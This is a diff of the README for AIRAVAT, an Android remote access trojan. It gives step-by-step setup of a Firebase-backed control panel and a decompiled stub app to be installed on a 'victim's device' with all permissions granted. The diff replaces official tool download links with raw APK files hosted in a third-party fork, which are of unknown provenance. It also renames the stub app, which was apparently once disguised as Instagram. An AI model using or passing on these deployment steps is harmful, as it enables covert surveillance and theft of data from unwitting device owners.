@@ -46,7 +46,7 @@
 ## Requirements
  - Firebase Account
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
+[ApkTool M](https://github.com/pashamasr01287654800/AIRAVAT/raw/refs/heads/main/com.gmail.heagoo.apkeditor.pro.apk) ( for Android)
 
 
 ## How to Build 
@@ -76,21 +76,21 @@
  1. Now Go to project overview and create an Android App and download the `google-services.json` file.
  1. Also create a web app and copy the config of webapp.
    ### Panel Setup
- 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
+ 1. You can use Github Pages, Firebase Hosting or any hosting site or [com.phlox.simpleserver.apk](https://github.com/pashamasr01287654800/AIRAVAT/raw/refs/heads/main/com.phlox.simpleserver.apk) to host the board.
  1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### Android RAT
- 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
+ 1. Download [hydra.apk](./ANDROID%20APP/hydra.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
     - Example 
        ```xml 
-       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
-       <string name="google_api_key">your_api_key</string>
-       <string name="google_app_id">your_app_id</string>
-       <string name="google_storage_bucket">your_storage_bucket_url</string>
-       <string name="project_id">project_id</string>
+       <string name="firebase_database_url">https://your_databaseURL.firebase.com</string>
+       <string name="google_api_key">your_apiKey</string>
+       <string name="google_app_id">your_appId</string>
+       <string name="google_storage_bucket">your_storageBucket</string>
+       <string name="project_id">your_projectId</string>
        ```
  1. Now compile the code with appt2.
  1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
